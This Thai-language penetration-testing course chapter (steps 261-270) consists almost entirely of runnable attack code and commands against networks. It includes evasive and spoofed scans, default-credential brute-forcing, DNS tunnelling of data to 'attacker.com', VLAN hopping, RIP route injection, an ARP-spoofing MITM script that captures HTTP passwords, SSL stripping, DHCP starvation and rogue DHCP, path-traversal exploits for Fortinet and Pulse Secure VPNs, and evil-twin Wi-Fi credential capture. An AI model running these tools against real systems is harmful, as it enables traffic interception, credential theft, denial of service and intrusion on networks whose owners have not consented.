# Part 27: Network Penetration Testing (Steps 261-270)

## ภาพรวม
ส่วนนี้ครอบคลุมการทดสอบความปลอดภัยเครือข่าย รวมถึง Network Scanning, Vulnerability Assessment, Firewall Evasion, VPN Security, VLAN Hopping, Router/Switch attacks และ Network Protocol attacks

---

## Step 261: Advanced Network Scanning

### Nmap Advanced Techniques
```bash
# Stealth SYN scan
nmap -sS -T4 -A -v 10.10.10.0/24

# Service version detection
nmap -sV --version-intensity 9 10.10.10.1

# OS detection
nmap -O --osscan-guess 10.10.10.1

# All TCP ports
nmap -p- -T4 10.10.10.1

# UDP scan
nmap -sU -p U:53,67,68,69,111,123,137,138,161 10.10.10.1

# Script scan
nmap --script=vuln 10.10.10.1
nmap --script=smb-vuln* 10.10.10.1
nmap --script=http-* 10.10.10.1

# Firewall evasion
nmap -f 10.10.10.1          # Fragment packets
nmap --mtu 8 10.10.10.1     # Custom MTU
nmap -D RND:10 10.10.10.1   # Decoy scan
nmap -S SPOOFED_IP 10.10.10.1  # Spoof source IP
nmap --scan-delay 2s 10.10.10.1  # Slow scan
nmap -sI zombie_host 10.10.10.1  # Idle scan
nmap --source-port 53 10.10.10.1  # Source port spoofing

# Timing templates (T0=Paranoid, T5=Insane)
nmap -T1 10.10.10.0/24  # Sneaky - slow
nmap -T4 10.10.10.0/24  # Aggressive - fast

# Output formats
nmap -oA scan_results 10.10.10.0/24  # All formats
nmap -oX scan.xml 10.10.10.0/24     # XML
nmap -oG scan.gnmap 10.10.10.0/24   # Greppable
```

### Python Network Scanner
```python
#!/usr/bin/env python3
# network_scanner.py

from scapy.all import *
import ipaddress
import threading
from queue import Queue

class NetworkScanner:
    def __init__(self, network):
        self.network = ipaddress.ip_network(network, strict=False)
        self.live_hosts = []
        self.open_ports = {}
        self.lock = threading.Lock()
    
    def arp_scan(self):
        """ARP scan สำหรับ local network"""
        print(f"[*] ARP scanning {self.network}...")
        
        arp_request = ARP(pdst=str(self.network))
        broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
        packet = broadcast / arp_request
        
        answered, _ = srp(packet, timeout=2, verbose=False)
        
        for sent, received in answered:
            ip = received.psrc
            mac = received.hwsrc
            self.live_hosts.append({'ip': ip, 'mac': mac})
            print(f"  [+] {ip} ({mac})")
        
        return self.live_hosts
    
    def icmp_scan(self):
        """ICMP ping scan"""
        print(f"[*] ICMP scanning {self.network}...")
        
        def ping_host(ip):
            packet = IP(dst=str(ip)) / ICMP()
            resp = sr1(packet, timeout=1, verbose=False)
            
            if resp:
                with self.lock:
                    self.live_hosts.append({'ip': str(ip), 'mac': 'unknown'})
                    print(f"  [+] {ip} is alive")
        
        queue = Queue()
        for host in self.network.hosts():
            queue.put(host)
        
        def worker():
            while not queue.empty():
                ip = queue.get()
                ping_host(ip)
                queue.task_done()
        
        threads = [threading.Thread(target=worker) for _ in range(50)]
        for t in threads:
            t.start()
        queue.join()
        for t in threads:
            t.join()
        
        return self.live_hosts
    
    def syn_scan(self, ip, ports):
        """SYN scan สำหรับ port scanning"""
        open_ports = []
        
        for port in ports:
            syn_packet = IP(dst=ip) / TCP(dport=port, flags='S')
            resp = sr1(syn_packet, timeout=1, verbose=False)
            
            if resp and resp.haslayer(TCP):
                if resp[TCP].flags == 'SA':  # SYN-ACK
                    open_ports.append(port)
                    # Send RST to close
                    rst = IP(dst=ip) / TCP(dport=port, flags='R')
                    send(rst, verbose=False)
        
        self.open_ports[ip] = open_ports
        return open_ports
    
    def service_detection(self, ip, port):
        """Banner grabbing"""
        try:
            import socket
            sock = socket.socket()
            sock.settimeout(3)
            sock.connect((ip, port))
            
            # Send initial data based on port
            if port in [80, 8080]:
                sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
            elif port == 21:
                pass  # FTP sends banner first
            elif port == 22:
                pass  # SSH sends banner first
            
            banner = sock.recv(1024)
            sock.close()
            return banner.decode('utf-8', errors='ignore').strip()[:100]
        except Exception:
            return None

# การใช้งาน
if __name__ == '__main__':
    scanner = NetworkScanner('192.168.1.0/24')
    
    # ARP scan
    hosts = scanner.arp_scan()
    
    # Port scan live hosts
    common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 3306, 3389, 5432, 8080]
    
    for host in hosts:
        print(f"\n[*] Scanning {host['ip']}...")
        open_ports = scanner.syn_scan(host['ip'], common_ports)
        
        for port in open_ports:
            banner = scanner.service_detection(host['ip'], port)
            print(f"  [+] Port {port} open: {banner or 'no banner'}")
```

---

## Step 262: Vulnerability Assessment Automation

### Automated VA Scanner
```python
#!/usr/bin/env python3
# vulnerability_assessment.py

import subprocess
import xml.etree.ElementTree as ET
import json
import requests
from typing import List, Dict

class VulnerabilityAssessment:
    def __init__(self, target, output_dir='/tmp/va'):
        self.target = target
        self.output_dir = output_dir
        import os
        os.makedirs(output_dir, exist_ok=True)
        self.vulnerabilities = []
    
    def run_nmap_vuln(self):
        """Nmap vulnerability scripts"""
        print(f"[*] Running Nmap vulnerability scan on {self.target}...")
        
        result = subprocess.run([
            'nmap', '-sV', '--script=vuln', '-oX',
            f'{self.output_dir}/nmap_vuln.xml',
            self.target
        ], capture_output=True, text=True, timeout=300)
        
        if result.returncode == 0:
            self._parse_nmap_xml(f'{self.output_dir}/nmap_vuln.xml')
    
    def _parse_nmap_xml(self, xml_file):
        """Parse Nmap XML output"""
        try:
            tree = ET.parse(xml_file)
            root = tree.getroot()
            
            for host in root.findall('host'):
                ip = host.find('address[@addrtype="ipv4"]')
                ip_addr = ip.get('addr') if ip is not None else 'unknown'
                
                for port in host.findall('.//port'):
                    port_id = port.get('portid')
                    state = port.find('state')
                    service = port.find('service')
                    
                    if state is not None and state.get('state') == 'open':
                        service_name = service.get('name', 'unknown') if service is not None else 'unknown'
                        
                        # Check scripts
                        for script in port.findall('script'):
                            script_id = script.get('id')
                            output = script.get('output', '')
                            
                            if 'VULNERABLE' in output or 'CVE' in output:
                                self.vulnerabilities.append({
                                    'host': ip_addr,
                                    'port': port_id,
                                    'service': service_name,
                                    'script': script_id,
                                    'output': output[:500]
                                })
                                print(f"  [!] Vuln on {ip_addr}:{port_id} - {script_id}")
        
        except Exception as e:
            print(f"[-] Error parsing XML: {e}")
    
    def check_cves_via_api(self, service_name, version):
        """Query NVD API สำหรับ CVEs"""
        print(f"[*] Querying CVEs for {service_name} {version}...")
        
        try:
            resp = requests.get(
                'https://services.nvd.nist.gov/rest/json/cves/2.0',
                params={'keywordSearch': f'{service_name} {version}', 'resultsPerPage': 5},
                timeout=10
            )
            
            if resp.status_code == 200:
                data = resp.json()
                cves = data.get('vulnerabilities', [])
                
                for cve in cves:
                    cve_id = cve.get('cve', {}).get('id', 'N/A')
                    desc = cve.get('cve', {}).get('descriptions', [{}])[0].get('value', 'N/A')
                    score = cve.get('cve', {}).get('metrics', {}).get('cvssMetricV31', [{}])[0].get('cvssData', {}).get('baseScore', 'N/A')
                    
                    print(f"  [{cve_id}] Score: {score} - {desc[:100]}")
                    self.vulnerabilities.append({
                        'cve': cve_id,
                        'score': score,
                        'description': desc[:200]
                    })
        
        except Exception as e:
            print(f"[-] CVE lookup error: {e}")
    
    def run_nikto(self, url):
        """Nikto web vulnerability scanner"""
        print(f"[*] Running Nikto on {url}...")
        
        result = subprocess.run([
            'nikto', '-h', url, '-Format', 'json',
            '-output', f'{self.output_dir}/nikto.json',
            '-nointeractive'
        ], capture_output=True, text=True, timeout=300)
        
        print(result.stdout[-1000:])
    
    def check_default_credentials(self, host, services):
        """Check default credentials"""
        print(f"[*] Checking default credentials on {host}...")
        
        creds_db = {
            'ftp': [('anonymous', ''), ('ftp', 'ftp'), ('admin', 'admin')],
            'ssh': [('root', 'root'), ('admin', 'admin'), ('ubuntu', 'ubuntu')],
            'telnet': [('admin', 'admin'), ('root', ''), ('cisco', 'cisco')],
            'http': [('admin', 'admin'), ('admin', 'password'), ('root', 'root')]
        }
        
        for service in services:
            service_lower = service.lower()
            if service_lower in creds_db:
                for user, passwd in creds_db[service_lower]:
                    if self._try_auth(host, service_lower, user, passwd):
                        print(f"  [!] Default creds on {service}: {user}:{passwd}")
                        self.vulnerabilities.append({
                            'host': host,
                            'service': service,
                            'issue': f'Default credentials: {user}:{passwd}',
                            'severity': 'Critical'
                        })
    
    def _try_auth(self, host, service, username, password):
        """Try to authenticate"""
        try:
            if service == 'ftp':
                import ftplib
                ftp = ftplib.FTP(host, timeout=5)
                ftp.login(username, password)
                ftp.quit()
                return True
            elif service == 'ssh':
                import paramiko
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host, username=username, password=password, timeout=5)
                client.close()
                return True
        except:
            return False
        return False
    
    def generate_report(self):
        print("\n" + "="*60)
        print("Vulnerability Assessment Summary")
        print("="*60)
        print(f"Total findings: {len(self.vulnerabilities)}")
        for vuln in self.vulnerabilities:
            print(f"  [{vuln.get('severity', 'Unknown')}] {vuln.get('host', '')} - {vuln.get('issue', vuln.get('cve', 'N/A'))}")

# การใช้งาน
if __name__ == '__main__':
    va = VulnerabilityAssessment('10.10.10.1')
    va.run_nmap_vuln()
    va.check_default_credentials('10.10.10.1', ['ftp', 'ssh'])
    va.generate_report()
```

---

## Step 263: Firewall และ IDS Evasion

### Firewall Evasion Techniques
```python
#!/usr/bin/env python3
# firewall_evasion.py

from scapy.all import *
import random

class FirewallEvasion:
    def __init__(self, target_ip, target_port=80):
        self.target = target_ip
        self.port = target_port
    
    def fragment_scan(self, ports):
        """สแกนโดยใช้ IP fragmentation"""
        print("[*] Fragmented packet scan...")
        
        for port in ports:
            # สร้าง SYN packet แล้วแตก fragment
            packet = IP(dst=self.target, flags='MF', frag=0) / TCP(dport=port, flags='S') / Raw(load=b'X'*8)
            resp = sr1(packet, timeout=2, verbose=False)
            
            if resp and resp.haslayer(TCP):
                print(f"  [+] Port {port}: {resp[TCP].flags}")
    
    def source_port_bypass(self, ports):
        """ใช้ trusted source port ผ่าน firewall"""
        print("[*] Source port bypass scan...")
        
        trusted_ports = [53, 80, 443, 25, 22, 8080]
        
        for trusted_port in trusted_ports:
            for target_port in ports:
                packet = IP(dst=self.target) / TCP(
                    sport=trusted_port,
                    dport=target_port,
                    flags='S'
                )
                resp = sr1(packet, timeout=1, verbose=False)
                
                if resp and resp.haslayer(TCP) and resp[TCP].flags == 0x12:  # SYN-ACK
                    print(f"  [!] Port {target_port} open via source port {trusted_port}")
    
    def decoy_scan(self, ports, num_decoys=10):
        """สแกนโดยใช้ decoy IPs"""
        print(f"[*] Decoy scan with {num_decoys} decoys...")
        
        decoys = [f"192.168.{random.randint(1,254)}.{random.randint(1,254)}" 
                  for _ in range(num_decoys)]
        
        for port in ports:
            # ส่ง packets จาก decoy IPs
            for decoy in decoys:
                packet = IP(src=decoy, dst=self.target) / TCP(dport=port, flags='S')
                send(packet, verbose=False)
            
            # ส่ง real packet
            real_packet = IP(dst=self.target) / TCP(dport=port, flags='S')
            resp = sr1(real_packet, timeout=1, verbose=False)
            
            if resp and resp.haslayer(TCP):
                print(f"  [*] Port {port}: {resp[TCP].flags}")
    
    def tunnel_through_dns(self, payload):
        """ส่งข้อมูลผ่าน DNS queries"""
        print("[*] DNS tunneling...")
        import base64
        
        encoded = base64.b64encode(payload.encode()).decode()
        chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
        
        for chunk in chunks:
            query = IP(dst=self.target) / UDP(dport=53) / DNS(
                qr=0, aa=0, qd=DNSQR(qname=f"{chunk}.attacker.com")
            )
            send(query, verbose=False)
        
        print(f"  [*] Sent {len(chunks)} DNS queries")
    
    def slow_scan(self, ports, delay=5):
        """สแกนช้าๆ เพื่อหลีก IDS detection"""
        import time
        print(f"[*] Slow scan with {delay}s delay...")
        
        for port in ports:
            packet = IP(dst=self.target) / TCP(dport=port, flags='S')
            resp = sr1(packet, timeout=1, verbose=False)
            
            if resp:
                print(f"  [*] Port {port}: {'open' if resp[TCP].flags == 0x12 else 'closed'}")
            
            time.sleep(delay + random.random() * 2)

# การใช้งาน
if __name__ == '__main__':
    evasion = FirewallEvasion('10.10.10.1')
    test_ports = [22, 80, 443, 8080, 3389]
    
    evasion.fragment_scan(test_ports)
    evasion.source_port_bypass(test_ports)
```

---

## Step 264: VLAN Hopping Attacks

### VLAN Hopping Techniques
```python
#!/usr/bin/env python3
# vlan_hopping.py

from scapy.all import *

class VLANHoppingAttack:
    def __init__(self, interface='eth0'):
        self.iface = interface
    
    def switch_spoofing(self, target_ip, target_vlan=10):
        """ทำตัวเองเป็น trunk port"""
        print("[*] Switch spoofing attack...")
        
        # DTP packet เพื่อ negotiate trunk
        # Scapy ไม่ได้มี DTP built-in - ใช้ Ethernet raw
        print("[*] Use Yersinia for DTP/STP attacks:")
        print("    yersinia dtp -attack 1  # DTP trunk")
        print("    yersinia stp -attack 4  # Become Root Bridge")
    
    def double_tagging(self, target_ip, attacker_vlan=1, victim_vlan=10):
        """Double 802.1Q tagging"""
        print(f"[*] Double tagging attack: VLAN {attacker_vlan} -> VLAN {victim_vlan}")
        
        # Outer tag = native VLAN (1), Inner tag = target VLAN (10)
        packet = (
            Ether(dst='ff:ff:ff:ff:ff:ff') /
            Dot1Q(vlan=attacker_vlan) /  # Outer tag (native VLAN)
            Dot1Q(vlan=victim_vlan) /    # Inner tag (target VLAN)
            IP(dst=target_ip) /
            ICMP()
        )
        
        print(f"[*] Sending double-tagged packet to {target_ip}...")
        sendp(packet, iface=self.iface, verbose=True)
    
    def sniff_vlan_traffic(self, vlan_id):
        """ดักฟัง VLAN traffic"""
        print(f"[*] Sniffing VLAN {vlan_id} traffic...")
        
        def packet_callback(pkt):
            if pkt.haslayer(Dot1Q):
                if pkt[Dot1Q].vlan == vlan_id:
                    print(f"  VLAN {vlan_id}: {pkt.summary()}")
        
        sniff(iface=self.iface, prn=packet_callback, filter="ether proto 0x8100")
    
    def create_vlan_interface(self, vlan_id):
        """Create VLAN sub-interface"""
        import subprocess
        
        print(f"[*] Creating VLAN {vlan_id} interface...")
        
        cmds = [
            f'modprobe 8021q',
            f'ip link add link {self.iface} name {self.iface}.{vlan_id} type vlan id {vlan_id}',
            f'ip link set {self.iface}.{vlan_id} up',
            f'dhclient {self.iface}.{vlan_id}'
        ]
        
        for cmd in cmds:
            print(f"  Running: {cmd}")
            subprocess.run(cmd.split())

# Yersinia commands for VLAN attacks
print("""
Yersinia VLAN Attack Commands:

# DTP trunk negotiation
yersinia -G  # GUI mode
yersinia dtp -attack 1  # Activate trunk

# STP - become root bridge
yersinia stp -attack 4  # Claim to be root bridge

# VTP attacks
yersinia vtp -attack 1  # Delete all VLANs
""")
```

---

## Step 265: Router และ Switch Attack

### Network Device Attacks
```bash
# Cisco ทดสอป default credentials
medusa -h 10.10.10.1 -u admin -P passwords.txt -M telnet
nmap --script=telnet-brute -p 23 10.10.10.1
nmap --script=snmp-brute -p 161 10.10.10.1

# SNMP enumeration
snmpwalk -v 2c -c public 10.10.10.1
snmpwalk -v 2c -c private 10.10.10.1 .1.3.6.1.2.1

# onesixtyone - SNMP community string brute force
onesixtyone -c community_strings.txt 10.10.10.1

# snmpcheck - เดาะสู่ข้อมูล SNMP
snmpcheck -t 10.10.10.1 -c public

# Cisco default creds
cisco-auditing-tool -h 10.10.10.1 -a passwords.txt

# Cisco Smart Install exploitation
python3 siet.py -i 10.10.10.1  # SIET tool

# CDP packet sniffing
tcpdump -i eth0 -s 1500 'ether proto 0x2000'  # CDP
```

### Routing Protocol Attacks
```python
#!/usr/bin/env python3
# routing_attacks.py

from scapy.all import *
from scapy.contrib.ospf import OSPF_Hdr, OSPF_Hello

class RoutingProtocolAttacks:
    def __init__(self, interface='eth0'):
        self.iface = interface
    
    def ospf_passive_sniff(self):
        """Sniff OSPF packets"""
        print("[*] Sniffing OSPF packets...")
        
        def ospf_callback(pkt):
            if pkt.haslayer(OSPF_Hdr):
                src = pkt[IP].src if pkt.haslayer(IP) else 'unknown'
                msg_type = pkt[OSPF_Hdr].type
                types = {1: 'Hello', 2: 'DBD', 3: 'LSR', 4: 'LSU', 5: 'LSAck'}
                print(f"  OSPF {types.get(msg_type, msg_type)} from {src}")
                
                if pkt.haslayer(OSPF_Hello):
                    print(f"    Router ID: {pkt[OSPF_Hdr].src}")
                    print(f"    Area ID: {pkt[OSPF_Hdr].area}")
        
        sniff(iface=self.iface, prn=ospf_callback, 
              filter='proto 89', count=20)  # Protocol 89 = OSPF
    
    def rip_inject_route(self, malicious_route='0.0.0.0', metric=1):
        """Inject fake RIP route"""
        print(f"[*] Injecting RIP route: {malicious_route}/0 metric {metric}")
        
        # RIP v2 packet
        rip_pkt = (
            IP(dst='224.0.0.9', ttl=1) /  # RIP multicast
            UDP(sport=520, dport=520) /
            RIP(version=2) /
            RIPEntry(
                af=2,
                tag=0,
                addr=malicious_route,
                mask='0.0.0.0',
                nexthop='0.0.0.0',
                metric=metric  # 1 = best route
            )
        )
        
        send(rip_pkt, iface=self.iface, verbose=True)
    
    def bgp_session_reset(self, bgp_peer_ip, as_number=65001):
        """BGP session teardown"""
        print(f"[*] Attempting BGP session reset against {bgp_peer_ip}...")
        
        # BGP NOTIFICATION packet
        # ต้องใช้ TCP session ที่ established
        print("[*] BGP attack requires established TCP session")
        print(f"[*] BGP runs on TCP port 179")
        print(f"[*] Use: nmap -sV -p 179 {bgp_peer_ip}")

# การใช้งาน
if __name__ == '__main__':
    attacker = RoutingProtocolAttacks()
    attacker.ospf_passive_sniff()
```

---

## Step 266: MITM Attacks

### Man-in-the-Middle Attacks
```bash
# ARP Spoofing
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP
arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP
# เปิด IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Ettercap
ettercap -Tq -M arp:remote /VICTIM_IP// /GATEWAY_IP//
ettercap -Tq -M arp:remote -P dns_spoof /VICTIM_IP// /GATEWAY_IP//

# Bettercap
bettercap -iface eth0
# ใน bettercap:
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets VICTIM_IP
arp.spoof on
net.sniff on

# SSL Stripping
bettercap -iface eth0 -eval "set http.proxy.sslstrip true; http.proxy on; arp.spoof on"

# DNS Spoofing
# แก้ไข /etc/ettercap/etter.dns
# mybank.com A 192.168.1.100
ettercap -Tq -M arp:remote -P dns_spoof /VICTIM_IP// /GATEWAY_IP//
```

### Python MitM Framework
```python
#!/usr/bin/env python3
# mitm_framework.py

from scapy.all import *
import threading

class MitMFramework:
    def __init__(self, victim_ip, gateway_ip, iface='eth0'):
        self.victim = victim_ip
        self.gateway = gateway_ip
        self.iface = iface
        self.running = False
        
        # เปิด IP forwarding
        import subprocess
        subprocess.run(['echo', '1', '>', '/proc/sys/net/ipv4/ip_forward'], shell=True)
    
    def get_mac(self, ip):
        """Get MAC address via ARP"""
        arp_req = ARP(pdst=ip)
        bcast = Ether(dst='ff:ff:ff:ff:ff:ff')
        answered, _ = srp(bcast/arp_req, timeout=2, verbose=False)
        
        if answered:
            return answered[0][1].hwsrc
        return None
    
    def spoof_arp(self, target_ip, spoof_ip):
        """Send spoofed ARP reply"""
        target_mac = self.get_mac(target_ip)
        if not target_mac:
            return
        
        pkt = ARP(
            op=2,  # is-at (reply)
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip
        )
        send(pkt, verbose=False)
    
    def start_arp_spoofing(self):
        """Start continuous ARP spoofing"""
        self.running = True
        print(f"[*] Starting ARP spoofing: {self.victim} <-> {self.gateway}")
        
        while self.running:
            self.spoof_arp(self.victim, self.gateway)
            self.spoof_arp(self.gateway, self.victim)
            time.sleep(2)
    
    def restore_arp(self):
        """Restore ARP tables"""
        victim_mac = self.get_mac(self.victim)
        gateway_mac = self.get_mac(self.gateway)
        
        if victim_mac and gateway_mac:
            send(ARP(op=2, pdst=self.victim, hwdst=victim_mac, 
                    psrc=self.gateway, hwsrc=gateway_mac), count=5, verbose=False)
            send(ARP(op=2, pdst=self.gateway, hwdst=gateway_mac,
                    psrc=self.victim, hwsrc=victim_mac), count=5, verbose=False)
            print("[+] ARP tables restored")
    
    def intercept_packets(self):
        """Intercept and analyze traffic"""
        print(f"[*] Intercepting traffic from {self.victim}...")
        
        def packet_handler(pkt):
            if pkt.haslayer(IP):
                if pkt[IP].src == self.victim:
                    if pkt.haslayer(TCP):
                        if pkt[TCP].dport == 80 and pkt.haslayer(Raw):
                            payload = pkt[Raw].load.decode('utf-8', errors='ignore')
                            if 'password' in payload.lower() or 'passwd' in payload.lower():
                                print(f"[!] Captured HTTP credentials from {self.victim}:")
                                print(f"    {payload[:200]}")
        
        sniff(iface=self.iface, prn=packet_handler,
              filter=f'host {self.victim}', store=False)
    
    def stop(self):
        self.running = False
        self.restore_arp()

# การใช้งาน
if __name__ == '__main__':
    import signal
    import sys
    
    mitm = MitMFramework(
        victim_ip='192.168.1.50',
        gateway_ip='192.168.1.1'
    )
    
    def signal_handler(sig, frame):
        print('\n[*] Stopping...')
        mitm.stop()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    # Start ARP spoofing in background
    arp_thread = threading.Thread(target=mitm.start_arp_spoofing)
    arp_thread.daemon = True
    arp_thread.start()
    
    # Start packet interception
    mitm.intercept_packets()
```

---

## Step 267: VPN Security Testing

### VPN Security Assessment
```bash
# OpenVPN testing
nmap --script=openvpn-info -p 1194 10.10.10.1
nmap -sU -p 1194 10.10.10.1

# IPsec testing
nmap --script=ike-version -sU -p 500 10.10.10.1
ike-scan 10.10.10.1
ike-scan --aggressive 10.10.10.1

# WireGuard port check
nmap -sU -p 51820 10.10.10.1

# Test VPN with common issues
# 1. Default credentials
# 2. Information disclosure
# 3. Weak ciphers
# 4. Split tunneling bypass

# SSL VPN (Pulse Secure, Fortinet, Citrix)
# CVE checking
nuclei -u https://vpn.target.com -t /root/nuclei-templates/cves/ -tags vpn

# Fortinet CVE-2018-13379
curl https://vpn.target.com/remote/fgt_lang?lang=../../../..//////////dev/cmdb/sslvpn_websession

# Pulse Secure CVE-2019-11510
curl 'https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../../../etc/passwd?/dana/html5acc/guacamole/'
```

---

## Step 268: Network Protocol Attacks

### Protocol-Specific Attacks
```python
#!/usr/bin/env python3
# protocol_attacks.py

from scapy.all import *

class NetworkProtocolAttacks:
    
    def dns_amplification(self, target_ip, dns_server='8.8.8.8'):
        """DNS Amplification (DoS concept - สำหรับ education เท่านั้น)"""
        print("[*] DNS Amplification concept:")
        print("    Spoof source IP -> target_ip")
        print("    Send ANY query to DNS server")
        print("    DNS server responds to victim (amplified response)")
        
        # ตัวอย่าง packet
        pkt = IP(src=target_ip, dst=dns_server) / UDP(dport=53) / DNS(
            qr=0, aa=0, qd=DNSQR(qname='google.com', qtype='ANY')
        )
        print(f"[*] Packet would be {len(pkt)} bytes, response up to 4000+ bytes")
        print(f"[*] Amplification factor: ~40x")
    
    def stp_root_bridge_attack(self, iface='eth0'):
        """STP Root Bridge claim"""
        print("[*] Claiming STP Root Bridge...")
        
        # ส่ง BPDU ด้วย priority ต่ำที่สุด
        print("[*] Use: yersinia stp -attack 4")
        print("    This claims to be Root Bridge with priority 0")
        print("    All traffic will route through attacker")
    
    def lldp_sniff(self, iface='eth0'):
        """Sniff LLDP packets"""
        print("[*] Sniffing LLDP packets...")
        
        def lldp_callback(pkt):
            # LLDP EtherType: 0x88CC
            if pkt.haslayer(Ether) and pkt[Ether].type == 0x88CC:
                print(f"[+] LLDP packet from {pkt[Ether].src}")
                print(f"    Raw: {pkt.show2(dump=True)[:200]}")
        
        sniff(iface=iface, prn=lldp_callback,
              filter='ether proto 0x88cc', count=5)
    
    def dhcp_starvation(self, iface='eth0', count=1000):
        """DHCP starvation attack"""
        print(f"[*] DHCP Starvation - sending {count} DISCOVER packets...")
        
        for i in range(count):
            # สร้าง random MAC
            mac = RandMAC()
            discover = (
                Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') /
                IP(src='0.0.0.0', dst='255.255.255.255') /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=mac, xid=RandInt()) /
                DHCP(options=[("message-type", "discover"), "end"])
            )
            sendp(discover, iface=iface, verbose=False)
        
        print(f"  [*] Sent {count} DHCP DISCOVER requests")
    
    def dhcp_rogue_server(self, iface='eth0', server_ip='192.168.1.100'):
        """Setup rogue DHCP server"""
        print(f"[*] Setting up rogue DHCP server at {server_ip}...")
        
        # dnsmasq config
        config = f"""
# Rogue DHCP config
dnsmasq config:
  dhcp-range=192.168.1.200,192.168.1.250,255.255.255.0,12h
  dhcp-option=3,{server_ip}  # Default gateway (attacker)
  dhcp-option=6,{server_ip}  # DNS server (attacker)
  interface={iface}
"""
        print(config)
        print("[*] Run: dnsmasq -C dnsmasq.conf --no-daemon")

# การใช้งาน
if __name__ == '__main__':
    attacks = NetworkProtocolAttacks()
    attacks.lldp_sniff()
```

---

## Step 269: Wireless Network Attacks (Advanced)

### WPA Enterprise Attack
```bash
# Setup Fake AP สำหรับ WPA Enterprise
# hostapd-wpe หรือ EAPHammer
git clone https://github.com/s0lst1c3/eaphammer
cd eaphammer
python3 eaphammer.py --cert-wizard  # Setup certs

# รับ Credentials
python3 eaphammer.py -i wlan0 --channel 6 --essid "CorpWiFi" \
  --creds --wpa mixed --auth wpa-eap

# PMKID Attack (no client required)
hcxdumptool -i wlan0 --enable_status=1 -o dump.pcapng
hcxtools/hcxpcapngtool -o hash.txt dump.pcapng
hashcat -m 22000 hash.txt wordlist.txt

# Evil Twin (Corporate)
airdrop-ng -i wlan0 -c 6 -d AA:BB:CC:DD:EE:FF  # deauth

# Captive Portal credentials
python3 eaphammer.py -i wlan0 --channel 6 --essid "CorpWiFi" \
  --captive-portal
```

---

## Step 270: Network Penetration Test Report

### Network Pentest Report Generator
```python
#!/usr/bin/env python3
# network_pentest_report.py

from datetime import datetime

def generate_network_report(findings, target_network, scope):
    """สร้างรายงาน Network Pentest"""
    
    report = f"""# Network Penetration Test Report

**Target Network:** {target_network}
**Scope:** {scope}
**Date:** {datetime.now().strftime('%B %d, %Y')}

## Executive Summary

| Metric | Value |
|--------|-------|
| Live Hosts | {findings.get('live_hosts', 'N/A')} |
| Open Ports Found | {findings.get('open_ports', 'N/A')} |
| Critical Vulnerabilities | {findings.get('critical', 0)} |
| High Vulnerabilities | {findings.get('high', 0)} |
| Medium Vulnerabilities | {findings.get('medium', 0)} |

## Attack Chain

```
Phase 1: Discovery
  {target_network} -> {findings.get('live_hosts', 0)} live hosts

Phase 2: Enumeration
  Services: {', '.join(findings.get('services', []))}

Phase 3: Exploitation
  {chr(10).join('  ' + path for path in findings.get('attack_paths', []))}

Phase 4: Post-Exploitation
  Lateral Movement: {findings.get('lateral_movement', 'N/A')}
  Data Accessed: {findings.get('data_accessed', 'N/A')}
```

## Recommendations

1. **Patch Management**: Update all systems with critical security patches
2. **Network Segmentation**: Implement proper VLAN segmentation
3. **Firewall Rules**: Review and restrict unnecessary open ports
4. **Strong Credentials**: Change default credentials on all network devices
5. **Monitoring**: Deploy IDS/IPS and centralized logging
6. **SNMP Security**: Upgrade to SNMPv3 with authentication
7. **Wireless Security**: Implement WPA3 and certificate-based auth
"""
    return report

# ตัวอย่าง
report = generate_network_report(
    findings={
        'live_hosts': 47,
        'open_ports': 215,
        'critical': 3,
        'high': 8,
        'medium': 15,
        'services': ['SMB', 'RDP', 'SSH', 'HTTP', 'FTP'],
        'attack_paths': [
            'Initial Access: FTP Anonymous Login on 192.168.1.20',
            'Lateral Movement: SMB relay to 192.168.1.50',
            'Privilege Escalation: Local admin -> Domain Admin via PtH',
            'Full Domain Compromise'
        ],
        'lateral_movement': 'Achieved via Pass-the-Hash',
        'data_accessed': 'Domain Controller NTDS.dit'
    },
    target_network='192.168.1.0/24',
    scope='Internal Network Assessment'
)

print(report)
```

---

## สรุป Part 27

| Step | หัวข้อ | เครื่องมือหลัก |
|------|--------|---------------|
| 261 | Advanced Network Scanning | Nmap, Scapy |
| 262 | Vulnerability Assessment | Custom VA scanner |
| 263 | Firewall/IDS Evasion | Scapy, fragmentation |
| 264 | VLAN Hopping | Yersinia, double-tagging |
| 265 | Router/Switch Attacks | SNMP, Cisco exploits |
| 266 | MITM Attacks | Bettercap, Scapy |
| 267 | VPN Security Testing | ike-scan, nuclei |
| 268 | Network Protocol Attacks | DHCP starvation, LLDP |
| 269 | Wireless Advanced | EAPHammer, PMKID |
| 270 | Network PT Report | Report generator |
